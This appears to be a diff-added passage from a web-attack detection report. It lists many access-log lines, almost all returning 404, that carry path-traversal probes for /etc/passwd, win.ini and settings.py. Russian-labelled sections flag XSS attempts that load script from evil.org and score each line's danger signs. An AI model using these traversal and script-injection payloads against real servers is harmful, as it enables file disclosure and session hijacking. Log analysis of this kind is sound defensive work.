+    - 2025-03-18 12:26:39,226 INFO 127.0.0.1 "GET /jacoco?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,280 INFO 127.0.0.1 "GET /owncloud?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,986 INFO 127.0.0.1 "GET /oauth?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,554 INFO 127.0.0.1 "GET /zimbra?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,972 INFO 127.0.0.1 "GET /violations?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,236 INFO 127.0.0.1 "GET /jenkins?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,812 INFO 127.0.0.1 "GET /scalyr?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,606 INFO 127.0.0.1 "GET /icinga?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,356 INFO 127.0.0.1 "GET /docker?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:03,101 INFO 127.0.0.1 "GET /jabber?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:04,272 INFO 127.0.0.1 "GET /collectl?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,337 INFO 127.0.0.1 "GET /fabric?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:44,424 INFO 127.0.0.1 "GET /email?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:42,539 INFO 127.0.0.1 "GET /dokuwiki?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,693 INFO 127.0.0.1 "GET /supervisord?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,315 INFO 127.0.0.1 "GET /stackstorm?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,357 INFO 127.0.0.1 "GET /spoint?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:41,448 INFO 127.0.0.1 "GET /proxy?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:43,289 INFO 127.0.0.1 "GET /package?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:04,281 INFO 127.0.0.1 "GET /conf?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:01,994 INFO 127.0.0.1 "GET /openshift?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,349 INFO 127.0.0.1 "GET /findbugs?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,138 INFO 127.0.0.1 "GET /ansible?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,509 INFO 127.0.0.1 "GET /violations?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,564 INFO 127.0.0.1 "GET /zipkin?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,365 INFO 127.0.0.1 "GET /log?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:40,024 INFO 127.0.0.1 "GET /team?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:41,919 INFO 127.0.0.1 "GET /teamcity?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,366 INFO 127.0.0.1 "GET /squid?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:44,280 INFO 127.0.0.1 "GET /conf?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,214 INFO 127.0.0.1 "GET /selenium?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,361 INFO 127.0.0.1 "GET /ganglia?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:42,340 INFO 127.0.0.1 "GET /chef?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,517 INFO 127.0.0.1 "GET /vpn?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:03,990 INFO 127.0.0.1 "GET /vtiger?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:04,290 INFO 127.0.0.1 "GET /confluence?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,715 INFO 127.0.0.1 "GET /keycloak?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,018 INFO 127.0.0.1 "GET /owncloud?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,290 INFO 127.0.0.1 "GET /confluence?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:44,831 INFO 127.0.0.1 "GET /kubernetes?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,838 INFO 127.0.0.1 "GET /sentry?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:02,573 INFO 127.0.0.1 "GET /activemq?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,371 INFO 127.0.0.1 "GET /gateway?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:44,299 INFO 127.0.0.1 "GET /consul?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:43,703 INFO 127.0.0.1 "GET /support?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:02,526 INFO 127.0.0.1 "GET /vtiger?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,361 INFO 127.0.0.1 "GET /city?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,583 INFO 127.0.0.1 "GET /adm?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,141 INFO 127.0.0.1 "GET /redmine?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,697 INFO 127.0.0.1 "GET /shpoint?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,697 INFO 127.0.0.1 "GET /ldap?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,494 INFO 127.0.0.1 "GET /osticket?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,737 INFO 127.0.0.1 "GET /aws?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,725 INFO 127.0.0.1 "GET /kibana?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,391 INFO 127.0.0.1 "GET /mattermost?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:04,489 INFO 127.0.0.1 "GET /grafana?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,707 INFO 127.0.0.1 "GET /liferay?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:02,762 INFO 127.0.0.1 "GET /clickhouse?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,642 INFO 127.0.0.1 "GET /dokuwiki?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,912 INFO 127.0.0.1 "GET /wiki?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,613 INFO 127.0.0.1 "GET /otrs?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,770 INFO 127.0.0.1 "GET /cloud?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,407 INFO 127.0.0.1 "GET /mcollective?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,734 INFO 127.0.0.1 "GET /logstash?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,896 INFO 127.0.0.1 "GET /kibana?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,765 INFO 127.0.0.1 "GET /bamb?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,517 INFO 127.0.0.1 "GET /redis?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:40,661 INFO 127.0.0.1 "GET /elasticsearch?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,604 INFO 127.0.0.1 "GET /registry?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,938 INFO 127.0.0.1 "GET /zimbra?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,755 INFO 127.0.0.1 "GET /kubernetes?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,435 INFO 127.0.0.1 "GET /gradle?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,669 INFO 127.0.0.1 "GET /email?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,750 INFO 127.0.0.1 "GET /sonarqube?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:02,785 INFO 127.0.0.1 "GET /codeship?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,680 INFO 127.0.0.1 "GET /fabric?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:43,746 INFO 127.0.0.1 "GET /team?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,765 INFO 127.0.0.1 "GET /ldap?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,772 INFO 127.0.0.1 "GET /maven?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,790 INFO 127.0.0.1 "GET /capistrano?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,760 INFO 127.0.0.1 "GET /splunk?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:41,545 INFO 127.0.0.1 "GET /registry?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,446 INFO 127.0.0.1 "GET /metric?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:40,687 INFO 127.0.0.1 "GET /findbugs?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,907 INFO 127.0.0.1 "GET /mongo?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,516 INFO 127.0.0.1 "GET /groovy?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,561 INFO 127.0.0.1 "GET /repo?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:45,204 INFO 127.0.0.1 "GET /otrs?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,807 INFO 127.0.0.1 "GET /checkstyle?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,619 INFO 127.0.0.1 "GET /rudder?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,698 INFO 127.0.0.1 "GET /ganglia?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,803 INFO 127.0.0.1 "GET /mercurial?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,937 INFO 127.0.0.1 "GET /kubernetes?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,802 INFO 127.0.0.1 "GET /collectl?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:03,628 INFO 127.0.0.1 "GET /saltstack?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:04,526 INFO 127.0.0.1 "GET /haproxy?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,813 INFO 127.0.0.1 "GET /mesos?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:40,719 INFO 127.0.0.1 "GET /git?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,583 INFO 127.0.0.1 "GET /saltstack?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,670 INFO 127.0.0.1 "GET /puppet?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:45,228 INFO 127.0.0.1 "GET /package?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,785 INFO 127.0.0.1 "GET /stackstorm?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,486 INFO 127.0.0.1 "GET /mongodb?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,843 INFO 127.0.0.1 "GET /clickhouse?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,984 INFO 127.0.0.1 "GET /admin?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,832 INFO 127.0.0.1 "GET /metrics?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,532 INFO 127.0.0.1 "GET /upguard?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:00,936 INFO 127.0.0.1 "GET /activemq?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,662 INFO 127.0.0.1 "GET /aws?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:39,688 INFO 127.0.0.1 "GET /radius?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,540 INFO 127.0.0.1 "GET /vagrant?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,991 INFO 127.0.0.1 "GET /logstash?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,412 INFO 127.0.0.1 "GET /city?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:41,803 INFO 127.0.0.1 "GET /stash?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:00,948 INFO 127.0.0.1 "GET /adm?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:38,548 INFO 127.0.0.1 "GET /variant?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,696 INFO 127.0.0.1 "GET /raygun?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:40,755 INFO 127.0.0.1 "GET /glpi?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,670 INFO 127.0.0.1 "GET /axelor?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,864 INFO 127.0.0.1 "GET /mongodb?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:00,963 INFO 127.0.0.1 "GET /admin?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,813 INFO 127.0.0.1 "GET /statsd?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,554 INFO 127.0.0.1 "GET /influxdb?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,873 INFO 127.0.0.1 "GET /monit?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:40,772 INFO 127.0.0.1 "GET /grafana?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:40,446 INFO 127.0.0.1 "GET /cluster?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,688 INFO 127.0.0.1 "GET /bamb?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:42,752 INFO 127.0.0.1 "GET /haproxy?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,564 INFO 127.0.0.1 "GET /jabber?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,580 INFO 127.0.0.1 "GET /vtiger?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,032 INFO 127.0.0.1 "GET /mcollective?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,607 INFO 127.0.0.1 "GET /saperp?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,763 INFO 127.0.0.1 "GET /icinga?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:00,993 INFO 127.0.0.1 "GET /apache?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,589 INFO 127.0.0.1 "GET /wiki?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:39,507 INFO 127.0.0.1 "GET /monitoring?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:38,911 INFO 127.0.0.1 "GET /consul?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:01,811 INFO 127.0.0.1 "GET /mail?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,697 INFO 127.0.0.1 "GET /bamboo?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,548 INFO 127.0.0.1 "GET /proxy?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,518 INFO 127.0.0.1 "GET /mysql?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,811 INFO 127.0.0.1 "GET /groovy?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,921 INFO 127.0.0.1 "GET /crm?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:40,480 INFO 127.0.0.1 "GET /collectl?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:01,004 INFO 127.0.0.1 "GET /api?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,608 INFO 127.0.0.1 "GET /zimbra?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,528 INFO 127.0.0.1 "GET /naginator?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:36,842 INFO 127.0.0.1 "GET /activemq?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,050 INFO 127.0.0.1 "GET /mercurial?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:37,581 INFO 127.0.0.1 "GET /jk?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,493 INFO 127.0.0.1 "GET /conf?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,017 INFO 127.0.0.1 "GET /api-int?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:04,589 INFO 127.0.0.1 "GET /jenkins?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:40,836 INFO 127.0.0.1 "GET /icinga?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,714 INFO 127.0.0.1 "GET /capistrano?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,546 INFO 127.0.0.1 "GET /netdata?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,847 INFO 127.0.0.1 "GET /im?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:45,065 INFO 127.0.0.1 "GET /mysql?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,635 INFO 127.0.0.1 "GET /adm?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,601 INFO 127.0.0.1 "GET /junit?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,070 INFO 127.0.0.1 "GET /metric?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,645 INFO 127.0.0.1 "GET /admin?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,573 INFO 127.0.0.1 "GET /radius?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,555 INFO 127.0.0.1 "GET /nextcloud?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:40,867 INFO 127.0.0.1 "GET /jabber?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:36,906 INFO 127.0.0.1 "GET /api?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,659 INFO 127.0.0.1 "GET /sensu?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:36,917 INFO 127.0.0.1 "GET /api-int?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:40,561 INFO 127.0.0.1 "GET /datadog?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,856 INFO 127.0.0.1 "GET /memcached?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:04,470 INFO 127.0.0.1 "GET /glpi?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,980 INFO 127.0.0.1 "GET /docs?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:45,104 INFO 127.0.0.1 "GET /netdata?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,571 INFO 127.0.0.1 "GET /oauth?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,095 INFO 127.0.0.1 "GET /mirror?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:45,116 INFO 127.0.0.1 "GET /nextcloud?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,866 INFO 127.0.0.1 "GET /mercurial?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:38,989 INFO 127.0.0.1 "GET /dokuwiki?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,746 INFO 127.0.0.1 "GET /ci?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:36,939 INFO 127.0.0.1 "GET /asterisk?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:41,684 INFO 127.0.0.1 "GET /sharepoint?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,848 INFO 127.0.0.1 "GET /juju?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,879 INFO 127.0.0.1 "GET /vpn?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,878 INFO 127.0.0.1 "GET /docker?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,001 INFO 127.0.0.1 "GET /elastic?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:45,129 INFO 127.0.0.1 "GET /nfs?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,859 INFO 127.0.0.1 "GET /junit?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:41,707 INFO 127.0.0.1 "GET /sip?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:04,619 INFO 127.0.0.1 "GET /juju?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,596 INFO 127.0.0.1 "GET /opentsdb?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,620 INFO 127.0.0.1 "GET /docker?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,120 INFO 127.0.0.1 "GET /mongodb?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,754 INFO 127.0.0.1 "GET /city?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,727 INFO 127.0.0.1 "GET /av?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,914 INFO 127.0.0.1 "GET /jk?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+
+[+] Эксплуатация XSS: 
+    - 2025-03-21 12:37:00,901 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 200
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:03,139 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 200
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:04,521 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 200
+      Содержит 2/10 опасных признака
+
+[+] Эксплуатация XSS: - неуспешные
+    - 2025-03-18 12:27:02,020 INFO 127.0.0.1 "GET /osticket?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:56,566 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:20,678 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:43,377 INFO 127.0.0.1 "GET /raygun?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:44,359 INFO 127.0.0.1 "GET /dev?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:27:01,979 INFO 127.0.0.1 "GET /nfs?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:27:01,107 INFO 127.0.0.1 "GET /bamboo?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:56,181 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:42,182 INFO 127.0.0.1 "GET /artifactory?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:37,303 INFO 127.0.0.1 "GET /elastic?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:44,906 INFO 127.0.0.1 "GET /mattermost?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:37,493 INFO 127.0.0.1 "GET /haproxy?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:44,679 INFO 127.0.0.1 "GET /jira?id=/* HTTP/1.1" 404
